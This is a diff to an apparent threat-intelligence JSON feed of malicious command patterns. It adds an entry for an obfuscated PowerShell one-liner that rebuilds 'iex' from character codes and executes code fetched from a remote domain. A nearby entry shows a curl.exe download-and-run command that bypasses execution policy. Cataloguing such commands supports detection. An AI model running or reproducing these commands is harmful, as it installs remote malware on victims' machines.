@@ -629,6 +629,19 @@
     ]
   },
   {
+    "Pattern": "powershell \"switch($true){default{&($($lc='';foreach($u in 105,101,120){$lc=$lc+[char]$u};$lc)) $(&('ir'+'m') 'apqiwg.com/z9xX')}}\"",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-25T13:21:22.502000+00:00",
+    "LastSeen": "2026-11-25T13:21:22.502000+00:00",
+    "ReportIds": [
+      "cmww5jriw0g6q0nml8w3skc6t"
+    ],
+    "PayloadExamples": [
+      "powershell \"switch($true){default{&($($lc='';foreach($u in 105,101,120){$lc=$lc+[char]$u};$lc)) $(&('ir'+'m') 'apqiwg[.]com/z9xX')}}\""
+    ]
+  },
+  {
     "Pattern": "powershell -ExecutionPolicy Bypass \"curl.exe -s -o $env:temp\\39310.ps1 523997074/39310;& $env:temp\\39310.ps1\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
